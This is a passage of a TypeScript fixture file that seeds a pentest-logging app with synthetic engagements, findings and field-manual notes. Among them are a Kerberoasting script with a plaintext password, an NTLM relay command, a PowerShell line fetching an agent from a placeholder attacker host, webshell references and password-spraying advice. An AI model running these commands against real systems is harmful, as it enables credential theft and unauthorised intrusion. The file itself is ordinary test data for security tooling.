  { id: "ca-5", engagementId: "e-lab", credId: "c-9", usernameId: null, hostId: "h-fs01", service: "smb", port: 445, result: "valid", authMode: "domain", detail: null, logEntryId: "l-5", at: ago(30 * MIN) },
];

const accessGrants: AccessGrant[] = [
  { id: "ag-1", engagementId: "e-lab", usernameId: "u-1", hostId: "h-fs01", level: "user", via: "WinRM with a sprayed password", logEntryId: null, at: ago(55 * MIN) },
];

// ---------------------------------------------------------------- findings

const findings: Finding[] = [
  {
    id: "f-1", engagementId: "e-lab", title: "Domain compromise via Kerberoastable service account with a weak password", severity: "critical",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", cvssScore: 9.9, status: "confirmed",
    description: "svc_sql has an SPN and a password found in rockyou.txt. Cracking its ticket gave a foothold that led to Domain Admin.",
    impact: "Full control of acme.corp.", remediation: "Use gMSA or 25+ character random passwords for service accounts.",
    exploitNotes: "GetUserSPNs then hashcat -m 13100.", lessons: "Check SPNs earlier.", refs: ["https://attack.mitre.org/techniques/T1558/003/"],
    hostIds: ["h-dc01", "h-sql01"], serviceIds: [], stepEntryIds: ["l-6", "l-7", "l-13", "l-8", "l-14", "l-23"], createdAt: ago(30 * MIN), updatedAt: ago(20 * MIN),
  },
  {
    id: "f-2", engagementId: "e-lab", title: "Cleartext database credentials in a deployed web.config", severity: "high", cvssVector: null, cvssScore: 7.5,
    status: "draft", description: "A connection string on fs01 holds a working password.", impact: "Database access.", remediation: "Move secrets to a vault.",
    exploitNotes: "", lessons: "", refs: [], hostIds: ["h-fs01"], serviceIds: [], stepEntryIds: ["l-4"], createdAt: ago(25 * MIN), updatedAt: ago(25 * MIN),
  },
  {
    id: "f-3", engagementId: "e-lab", title: "SNMP community string public", severity: "medium", cvssVector: null, cvssScore: null,
    status: "draft", description: "", impact: "", remediation: "", exploitNotes: "", lessons: "", refs: [], hostIds: ["h-web"], serviceIds: [], stepEntryIds: ["l-15"],
    createdAt: ago(22 * MIN), updatedAt: ago(22 * MIN),
  },
  {
    id: "f-4", engagementId: "e-lab", title: "Directory listing on /admin", severity: null, cvssVector: null, cvssScore: null,
    status: "draft", description: "", impact: "", remediation: "", exploitNotes: "", lessons: "", refs: [], hostIds: [], serviceIds: [], stepEntryIds: [],
    createdAt: ago(21 * MIN), updatedAt: ago(21 * MIN),
  },
  ...[
    ["Unauthenticated remote code execution through a deserialisation flaw in the legacy report export endpoint of the customer portal", "critical", 10, "reported", ["h-fl-1", "h-fl-2", "h-fl-3", "h-fl-4"]],
    ["SMB signing not required", "high", 8.1, "confirmed", ["h-fl-2"]],
    ["Outdated TLS configuration", "medium", 5.3, "draft", ["h-fl-4"]],
    ["Verbose server banner", "low", 2.1, "draft", ["h-fl-3"]],
    ["Unrated observation about the backup share", null, null, "draft", []],
    ["Informational: guest account enabled", "info", null, "confirmed", ["h-fl-2", "h-fl-3"]],
  ].map(([title, severity, cvssScore, status, hostIds], i): Finding => ({
    id: `f-fl-${i + 1}`, engagementId: "e-fl", title: title as string, severity: severity as Finding["severity"], cvssVector: null,
    cvssScore: cvssScore as number | null, status: status as Finding["status"], description: "", impact: "", remediation: "",
    exploitNotes: "", lessons: "", refs: [], hostIds: hostIds as string[], serviceIds: [], stepEntryIds: [],
    createdAt: ago((40 - i) * MIN), updatedAt: ago((40 - i) * MIN),
  })),
];

const findingFiles: FindingFile[] = [
  { id: "ff-1", findingId: "f-1", name: "kerberoast.sh", language: "bash", content: "#!/bin/sh\nimpacket-GetUserSPNs acme.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request\n", createdAt: ago(20 * MIN), updatedAt: ago(20 * MIN) },
];

const failedAttempts: FailedAttempt[] = [
  { id: "fa-1", engagementId: "e-lab", hostId: "h-web", findingId: null, title: "Anonymous FTP upload", reasonKind: "control", reason: "Anonymous login is disabled.", private: false, logEntryId: "l-10", createdAt: ago(60 * MIN), updatedAt: ago(60 * MIN) },
];

const flLog: LogEntry[] = [
  cmd("Relay attempt against the DC", "ntlmrelayx.py -t smb://192.0.2.11 -smb2support", "SMB signing is required", ["h-fl-2"], { engagementId: "e-fl", at: ago(3 * HOUR) }),
].map((e) => ({ ...e, id: "l-fl-1" }));
log.push(...flLog);

const flAttempt = (n: number, over: Partial<FailedAttempt>): FailedAttempt => ({
  id: `fa-fl-${n}`, engagementId: "e-fl", hostId: null, findingId: null, title: "", reasonKind: "control", reason: "", private: false,
  logEntryId: null, createdAt: ago(n * 30 * MIN), updatedAt: ago(n * 30 * MIN), ...over,
});
failedAttempts.push(
  flAttempt(1, { title: "Relay to the DC", hostId: "h-fl-2", reason: "SMB signing is required.", logEntryId: "l-fl-1" }),
  flAttempt(2, { title: "Spray the VPN portal", hostId: "h-fl-1", reasonKind: "access", reason: "Account lockout after three tries, and the lockout window turned out to be the full 30 minutes, so the spray was stopped and the user list was cut down before a second attempt." }),
  flAttempt(3, { title: "Wrong wordlist for the hash", reasonKind: "operator", reason: "Used a Windows wordlist against a Linux hash.", private: true }),
);

const ruledOut: RuledOut[] = [
  { id: "r-1", engagementId: "e-lab", hostId: "h-web", text: "vsftpd 3.0.3 backdoor", reason: "Backdoor was in 2.3.4 only.", private: false, sourceKind: null, sourceId: null, createdAt: ago(90 * MIN) },
  // Created by the dead-end verdict on h-web's 21/tcp.
  { id: "r-2", engagementId: "e-lab", hostId: "h-web", text: "21/tcp vsftpd 3.0.3", reason: "Anonymous login is disabled.", private: false, sourceKind: "service", sourceId: services.find((s) => s.hostId === "h-web" && s.port === 21)!.id, createdAt: ago(80 * MIN) },
];

// ---------------------------------------------------------------- host identity and privesc vectors

const hostIdentity: HostIdentity[] = [
  { hostId: "h-exam-ms01", username: "ms01\\iis_apppool", privileges: ["SeImpersonatePrivilege"], groups: ["BUILTIN\\IIS_IUSRS"], entryId: null, updatedAt: ago(30 * MIN) },
];

const vectors: PrivescVector[] = [
  { id: "pv-1", hostId: "h-exam-ms01", title: "SeImpersonatePrivilege (potato)", status: "try", source: "auto", createdAt: ago(30 * MIN), updatedAt: ago(30 * MIN) },
  { id: "pv-2", hostId: "h-exam-ms01", title: "Unquoted service path", status: "untested", source: "manual", createdAt: ago(25 * MIN), updatedAt: ago(25 * MIN) },
  { id: "pv-3", hostId: "h-exam-ms01", title: "SeImpersonatePrivilege abuse through a named pipe", status: "try", source: "manual", createdAt: ago(20 * MIN), updatedAt: ago(20 * MIN) },
  { id: "pv-4", hostId: "h-exam-ms01", title: "AlwaysInstallElevated", status: "ruled_out", source: "manual", createdAt: ago(15 * MIN), updatedAt: ago(15 * MIN) },
];

// ---------------------------------------------------------------- network, notes, cleanup

const tunnels: Tunnel[] = [
  { id: "t-1", engagementId: "e-lab", kind: "ligolo", viaHostId: "h-pivot", subnets: ["10.10.21.0/24", "10.10.22.0/24"], callbackIp: "192.0.2.10", status: "up", notes: "ligolo-ng agent, tun interface ligolo", createdAt: ago(50 * MIN), updatedAt: ago(50 * MIN) },
];

const hops: Hop[] = [
  { id: "hp-1", engagementId: "e-lab", fromHostId: null, toHostId: "h-web", via: "Upload form webshell", logEntryId: "l-16", at: ago(110 * MIN), updatedAt: ago(110 * MIN) },
  { id: "hp-2", engagementId: "e-lab", fromHostId: "h-web", toHostId: "h-pivot", via: "Reused svc_backup over RDP", logEntryId: null, at: ago(75 * MIN), updatedAt: ago(75 * MIN) },
];

const notes: Note[] = [
  { ownerId: "e-lab", engagementId: "e-lab", hostId: null, body: "Scope: 10.10.20.0/24 and 10.10.21.0/24 once the pivot is up.\n\nTODO: re-run the UDP scan, SNMP looked interesting.", private: false, updatedAt: ago(30 * MIN) },
  { ownerId: "h-web", engagementId: "e-lab", hostId: "h-web", body: "Apache and nginx both listening; nginx on 443 proxies to Tomcat on 8443.", private: false, updatedAt: ago(35 * MIN) },
];

const cleanup: CleanupItem[] = [
  { id: "cl-1", engagementId: "e-lab", hostId: "h-web", kind: "file", target: "/var/www/html/uploads/a.php", notes: "The uploaded webshell.", sourceEntryId: "l-16", suggestionKey: null, status: "open", removedAt: null, createdAt: ago(100 * MIN), updatedAt: ago(100 * MIN) },
  { id: "cl-2", engagementId: "e-lab", hostId: "h-pivot", kind: "service", target: "ligolo-agent (scheduled task)", notes: null, sourceEntryId: null, suggestionKey: null, status: "removed", removedAt: ago(10 * MIN), createdAt: ago(50 * MIN), updatedAt: ago(10 * MIN) },
];

// ---------------------------------------------------------------- checklist

const done = (ownerId: string, goalId: string, completedAt: number, over: Partial<ChecklistItem> = {}): ChecklistItem => ({
  ownerId, goalId, status: "done", notes: null, completedAt, auto: false, autoFrom: null, statusManual: true, evidence: [], updatedAt: completedAt, ...over,
});

const checklist: ChecklistItem[] = [
  // The goal everything below is newer than: GoalRow's "12 new credentials since this was done".
  done("e-lab", "e-setup-scans", ago(6 * HOUR)),
  done("e-lab", "e-setup-logging", ago(6 * HOUR)),
  done("h-web", "h-enum-identified", ago(5 * HOUR), { auto: true, statusManual: false }),
  { ownerId: "h-web", goalId: "h-enum-os", status: "in_progress", notes: "Ubuntu 22.04 by banner.", completedAt: null, auto: false, autoFrom: null, statusManual: true, evidence: [{ entryId: "l-1" }], updatedAt: ago(30 * MIN) },
];

// ---------------------------------------------------------------- misc

const progress: Record<string, Progress> = {
  "e-lab": { hostsTotal: 6, hostsRooted: 2, flagsFound: 2, flagsTotal: 12 },
  "e-exam": { hostsTotal: 5, hostsRooted: 0, flagsFound: 1, flagsTotal: 6 },
  "e-old": { hostsTotal: 1, hostsRooted: 1, flagsFound: 2, flagsTotal: 2 },
  "e-pay": { hostsTotal: 2, hostsRooted: 0, flagsFound: 0, flagsTotal: 4 },
  "e-board": { hostsTotal: 23, hostsRooted: 1, flagsFound: 0, flagsTotal: 0 },
  "e-fl": { hostsTotal: 4, hostsRooted: 1, flagsFound: 0, flagsTotal: 0 },
};

const backups: BackupInfo[] = [
  { file: "raven-2026-11-05-daily.db", reason: "daily", createdAt: ago(4 * HOUR), sizeBytes: 4_718_592 },
  { file: "raven-2026-11-04-pre-import.db", reason: "pre-import", createdAt: ago(28 * HOUR), sizeBytes: 4_521_984 },
];

const settings: Settings = {
  autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)", "Windows 11 (VM)"], attackerIp: "192.0.2.10",
  listenerPort: "4444", kaliUser: "audit", windowsToolsDir: "~/tools/windows", linuxToolsDir: "/opt/tools",
  fieldManualPath: "/Users/audit/Documents/Field-Manual", nvdKeySet: true,
};

export const FIXTURES: AuditFixtures = {
  engagements, hosts, services, log, attachments, checklist, notes, ruledOut, hostIdentity, vectors, tunnels, hops, credentials, usernames,
  credAttempts, triedPairs, payloadBuilds, extractions, accessGrants, findings, findingFiles, failedAttempts, cleanup, backups, settings,
};

export const FIXTURE_PROGRESS = progress;

// ---------------------------------------------------------------- Manual notes

/**
 * Synthetic Field Manual notes (relative path, file text) for the Manual. Invented wording throughout; addresses are
 * RFC 5737 and names end in example.test. Shapes cover the real range: a long note with six tables (one five columns
 * wide with long cells), a tool page whose commands carry placeholders, a note with every link kind, short filler notes
 * so the rail is as full as a real import's.
 */
export const AUDIT_NOTE_IDS = {
  long: "fnd-zz-status-codes",
  tool: "tool-zz-scanner",
  links: "fnd-zz-protocol",
  report: "rep-zz-finding",
  lookup: "fnd-zz-error-lookup",
} as const;

const fm = (id: string, title: string, type: string) => `---\nid: ${id}\ntitle: ${title}\ntype: ${type}\n---\n`;

const STATUS_ROWS: [string, string, string, string, string][] = [
  ["0xC0000022", "STATUS_ACCESS_DENIED", "The account authenticated but holds no right to the share or pipe it asked for.", "A valid low-privilege user against an admin-only share such as C$ or ADMIN$ on zzfs01.example.test.", "List shares with the same account and read the ones it can; keep the credential, it works."],
  ["0xC000006D", "STATUS_LOGON_FAILURE", "The name or the secret is wrong, or the account is not known to the target at all.", "A typo in the domain part, a local account tried as a domain one, or a stale hash.", "Try the account as local (--local-auth), then check the domain name on the DC."],
  ["0xC000006E", "STATUS_ACCOUNT_RESTRICTION", "The secret is right, but a policy blocks this kind of logon.", "Blank passwords over the network, or Protected Users blocking NTLM.", "Use Kerberos instead of NTLM, or log on interactively where the policy allows it."],
  ["0xC0000071", "STATUS_PASSWORD_EXPIRED", "The secret is right and has expired.", "Old service accounts in a lab that nobody logged on to for months.", "Change it with smbpasswd or kpasswd, then note the new value in Credentials."],
  ["0xC0000072", "STATUS_ACCOUNT_DISABLED", "The secret is right; the account is switched off.", "Leavers kept for audit, decoy accounts.", "Keep the secret: it is often reused by an enabled sibling account."],
  ["0xC0000234", "STATUS_ACCOUNT_LOCKED_OUT", "Too many failures: the account is locked for the lockout window.", "A spray without a delay, or another tester's spray on the same lab.", "Stop spraying that account; read the lockout policy before the next round."],
  ["0xC00000CC", "STATUS_BAD_NETWORK_NAME", "The share name does not exist on that host.", "A share listed on a sibling host, or a trailing space in the name.", "List shares again and copy the name exactly, quotes included."],
  ["0xC0000203", "STATUS_USER_SESSION_DELETED", "The server closed the session mid-way.", "SMB signing required while the client sends unsigned packets.", "Retry with signing on, or pick a tool that signs by default."],
  ["0xC0000225", "STATUS_NOT_FOUND", "The named pipe or object is not there.", "A service that is stopped, so its pipe never opened, such as `\\\\zzfs01.example.test\\pipe\\zz-agent`.", "Check the service state over RPC before blaming the credential."],
  ["0xC000015B", "STATUS_LOGON_TYPE_NOT_GRANTED", "The account may not log on this way on this host.", "Deny network logon for local accounts by group policy.", "Use the account where it is allowed, such as RDP or WinRM if those are granted."],
];

const KERBEROS_ROWS: [string, string, string][] = [
  ["KDC_ERR_PREAUTH_FAILED", "Wrong password for a real account", "The name exists: keep it for spraying later."],
  ["KDC_ERR_C_PRINCIPAL_UNKNOWN", "No such account", "Drop the name from the list."],
  ["KDC_ERR_CLIENT_REVOKED", "Locked or disabled", "Stop; the account is out of play for now."],
  ["KRB_AP_ERR_SKEW", "Clocks more than five minutes apart", "Sync the clock with the DC, then retry."],
  ["KDC_ERR_ETYPE_NOSUPP", "The encryption type is not allowed", "Ask for AES instead of RC4."],
];

const NORMAL_ROWS: [string, string, string, string][] = [
  ["Port 445 open, 139 closed", "Yes", "Direct SMB without NetBIOS", "Nothing to do"],
  ["Null session lists shares", "No, on a modern host", "Anonymous access left on", "Read every share it lists"],
  ["Signing not required", "Common on member servers", "Relay is possible", "Note it for the report"],
  ["Guest account enabled", "No", "A weak default left on", "Try guest with an empty password"],
];

const RELAY_FLAGS: [string, string][] = [
  ["-s *", "Listen on every address the host has, so the relay answers on the lab network and on loopback alike; narrow it to one address when another service already holds the port there."],
  ["-m MODE", "The relay mode. The default forwards each request to the program it starts, unchanged; the other modes rewrite the request first, which some older targets refuse outright."],
  ["-o \"OPTIONS\"", "Options passed through to that program, quoted as one value. Anything with a space in it needs the quotes, or the relay reads the second word as a flag of its own and stops."],
  ["-n PORT", "The local port the relay listens on. Pick one the target can reach back to; a closed port here looks exactly like a failed relay in the output, so check it first."],
  ["-g {GUID}", "The class identifier of the object to ask for. Leave it unset to try the built-in list in order, which is slower but works on most builds without any lookup beforehand."],
];

function longNote(): string {
  const L: string[] = [];
  L.push("# Zz Status Codes", "");
  L.push("What a failed logon is telling you, read before you change the credential. Every code below comes back from a real protocol step; the table says what it means and what to try next.", "");
  L.push("## Core concept", "");
  L.push("A logon fails for one of three reasons: the name, the secret, or the policy. The code tells you which one, so read it before you try anything else.", "");
  L.push("- **Name**: the account is not known where you asked.", "- **Secret**: the name is known and the secret is wrong.", "- **Policy**: both are right and something forbids this logon.", "");
  L.push("See [[Zz-Protocol#How it works|how the exchange works]] for the packets behind each step.", "");
  L.push("## SMB and NTLM", "");
  L.push("**Table 1 — SMB / NTLM status codes**", "");
  L.push("| Code | Name | What it means | Usual cause | What to try next |", "|---|---|---|---|---|");
  for (const r of STATUS_ROWS) L.push(`| \`${r[0]}\` | \`${r[1]}\` | ${r[2]} | ${r[3]} | ${r[4]} |`);
  L.push("");
  L.push("### Reading the code", "");
  L.push("The code is in the reply to the session setup. Most tools print the name; some print only the number.", "");
  L.push("```text title:\"Example reply\"", "SMB  192.0.2.44  445  ZZFS01  [-] zz.example.test\\zzuser:Winter2026 STATUS_LOGON_FAILURE", "```", "");
  L.push("## Kerberos", "");
  L.push("**Table 2 — Kerberos errors** (zzkerb prints `KDC_ERR_*` codes with a hex value)", "");
  L.push("| Error | Means | Do |", "|---|---|---|");
  for (const r of KERBEROS_ROWS) L.push(`| \`${r[0]}\` | ${r[1]} | ${r[2]} |`);
  L.push("");
  L.push("## Is this normal?", "");
  L.push("**Table 3 — Is this normal?**", "");
  L.push("| You see | Normal? | Why | Do |", "|---|---|---|---|");
  for (const r of NORMAL_ROWS) L.push(`| ${r[0]} | ${r[1]} | ${r[2]} | ${r[3]} |`);
  L.push("");
  L.push("## Decision tree", "");
  L.push("1. Read the code.", "2. Name problem: fix the name or the domain part.", "3. Secret problem: try the next secret, slowly.", "4. Policy problem: change how you log on, not what you log on with.", "");
  // Cases: enough worked examples that the note runs past 300 lines, as the owner's longest notes do.
  for (let i = 1; i <= 14; i++) {
    L.push(`### Case ${i}: zzhost${String(i).padStart(2, "0")}.example.test`, "");
    L.push(`The tester tried a domain account against 192.0.2.${40 + i} and read the reply below. Work out which of the three reasons it was before reading on.`, "");
    L.push("```text", `SMB  192.0.2.${40 + i}  445  ZZHOST${String(i).padStart(2, "0")}  [-] zz.example.test\\zzsvc${i}:Spring2026 ${STATUS_ROWS[i % STATUS_ROWS.length][1]}`, "```", "");
    L.push(`It was a ${["name", "secret", "policy"][i % 3]} problem. ${STATUS_ROWS[i % STATUS_ROWS.length][2]}`, "");
    L.push(`- What fixed it: ${STATUS_ROWS[i % STATUS_ROWS.length][4]}`, `- What did not: trying the same secret again.`, "");
  }
  L.push("## Status codes in the report", "");
  L.push("**Table 4 — Wording for the report**", "");
  L.push("| Seen | Write |", "|---|---|");
  L.push("| `STATUS_ACCESS_DENIED` on a share | The account could authenticate but could not read the share. |");
  L.push("| `STATUS_ACCOUNT_LOCKED_OUT` | Testing locked the account; the client was told at the time. |");
  L.push("");
  L.push("**Table 5 — Quick lookup**", "");
  L.push("| Number | Name |", "|---|---|");
  for (const r of STATUS_ROWS) L.push(`| \`${r[0]}\` | ${r[1]} |`);
  L.push("");
  // A key-column table: short flags, some with a space inside, next to long descriptions with room to spare.
  L.push("**Table 6 — Zzrelay flags**", "");
  L.push("| Flag | Does |", "|---|---|");
  for (const r of RELAY_FLAGS) L.push(`| \`${r[0]}\` | ${r[1]} |`);
  L.push("");
  L.push("## Related", "", "- [[Zz-Protocol]]", "- [[Zz-Scanner]]", "");
  return L.join("\n");
}

const TOOL_NOTE = [
  "# Zz Scanner",
  "A synthetic scanner used to show filled commands. Every command fills from the host in view.",
  "",
  "## Usage",
  "",
  "```bash title:\"Kali: scan the host\"",
  "zzscan -t {TARGET_IP} -p 1-65535 --rate 2000 -o zzscan-{TARGET_IP}.txt",
  "```",
  "",
  "```bash title:\"Kali: authenticated scan\"",
  "zzscan -t {TARGET_IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} --shares --sessions",
  "```",
  "",
  "```powershell title:\"Target: fetch the agent\"",
  "iwr http://{LHOST}:{LPORT}/zz-agent.exe -OutFile C:\\Windows\\Temp\\zz-agent.exe",
  "```",
  "",
  "## Output",
  "",
  "```text",
  "ZZSCAN  192.0.2.44  445/tcp open  microsoft-ds",
  "ZZSCAN  192.0.2.44  5985/tcp open  wsman",
  "```",
  "",
  "**Table 1 — Flags**",
  "",
  "| Flag | Meaning |",
  "|---|---|",
  "| `-t` | Target address or range |",
  "| `-u`, `-p` | Name and secret for an authenticated scan |",
  "| `--rate` | Packets per second; drop it on a slow lab link |",
  "",
  "### Tips",
  "",
  "- Read [[Zz-Status-Codes]] when a logon fails.",
  "- The [[Port-Scanning]] card has the full scan sequence.",
  "",
].join("\n");

const LINKS_NOTE = [
  "# Zz Protocol",
  "How a synthetic protocol exchange works, and where to read on.",
  "",
  "## How it works",
  "",
  "The client asks, the server answers with a code. The codes are in [[Zz-Status-Codes]]; the [[Zz-Status-Codes#Decision tree|decision tree]] says what to do with each one.",
  "",
  "Kerberos is the other half: the [[Kerberos-Enumeration]] card lists the commands, and [[Zz-Not-In-Vault]] is a page that does not exist yet.",
  "",
  "## Failure modes",
  "",
  "| Failure | Read |",
  "|---|---|",
  "| Wrong secret | [[Zz-Status-Codes#Kerberos]] |",
  "| Clock skew | [[Kerberos-Enumeration\\|the card]] |",
  "| Unknown | [[Zz-Another-Missing-Page]] |",
  "",
].join("\n");

/** A lookup table: key cells, an action column with placeholder commands (one with a secret, one row with none). */
const LOOKUP_NOTE = [
  "# Zz Error Lookup",
  "## Login errors",
  "**Table 1 — Zz login errors**",
  "| Error | Means | Usually caused by | Do this | Card |",
  "| - | - | - | - | - |",
  "| `STATUS_ZZ_DENIED` | The account has no right to the share. | A low-privilege user against an admin share on zzfs01.example.test. | List the shares it can read: `nxc smb {TARGET_IP} -u '{USER}' -p '{PASS}' --shares` | [[Zz-Share-Card]] |",
  "| `STATUS_ZZ_LOGON` | The name or the secret is wrong. | A local account tried as a domain one. | Retry as local: `nxc smb {TARGET_IP} -u '{USER}' -p '{PASS}' --local-auth` | |",
  "| `STATUS_ZZ_EXPIRED` | The secret is right and has expired. | A service account nobody used for months. | Check the password policy: `nxc smb {TARGET_IP} --pass-pol` | |",
  "| `STATUS_ZZ_LOCKED` | The account is locked for the lockout window. | A spray without a delay. | Stop spraying that account and wait out the window. | |",
  "| `STATUS_ZZ_DISABLED` | The secret is right; the account is switched off. | A leaver kept for audit. | Keep the secret: an enabled sibling often reuses it. | |",
  "| `STATUS_ZZ_SKEW` | The clocks are too far apart for Kerberos. | A VM that was suspended. | Sync with the DC: `ntpdate {DC_IP}` | |",
  "",
].join("\n");

const FILLER: [string, string][] = [
  ["04-Foundations", "Name Resolution Order"], ["04-Foundations", "Ports at a Glance"], ["04-Foundations", "Tokens and Privileges"],
  ["04-Foundations", "Hash Formats"], ["04-Foundations", "Shells and TTYs"], ["04-Foundations", "Web Request Anatomy"],
  ["03-Tools", "Zz Mapper"], ["03-Tools", "Zz Relay"], ["03-Tools", "Zz Cracker"], ["03-Tools", "Zz Fuzzer"], ["03-Tools", "Zz Tunnel"],
  ["03-Tools", "Zz Shell Catcher"], ["03-Tools", "Zz Share Browser"], ["03-Tools", "Zz Directory Walker With A Long Page Title"],
  ["05-Reporting", "Writing Remediation"], ["05-Reporting", "Severity Ratings"],
];

export const AUDIT_NOTE_SOURCES: [string, string][] = [
  ["04-Foundations/Zz-Status-Codes.md", fm(AUDIT_NOTE_IDS.long, "Zz Status Codes", "foundation") + longNote()],
  ["03-Tools/Zz-Scanner.md", fm(AUDIT_NOTE_IDS.tool, "Zz Scanner", "tool") + TOOL_NOTE],
  ["04-Foundations/Zz-Protocol.md", fm(AUDIT_NOTE_IDS.links, "Zz Protocol", "foundation") + LINKS_NOTE],
  ["04-Foundations/Zz-Error-Lookup.md", fm(AUDIT_NOTE_IDS.lookup, "Zz Error Lookup", "foundation") + LOOKUP_NOTE],
  ["05-Reporting/Zz-Finding-Template.md", fm(AUDIT_NOTE_IDS.report, "Zz Finding Template", "reporting") + "# Zz Finding Template\n## Structure\nTitle, impact, evidence, fix.\n"],
  ...FILLER.map(([dir, title]): [string, string] => [`${dir}/${title.replace(/ /g, "-")}.md`, `# ${title}\nA short synthetic note.\n## Summary\nTwo lines of invented text.\n`]),
];
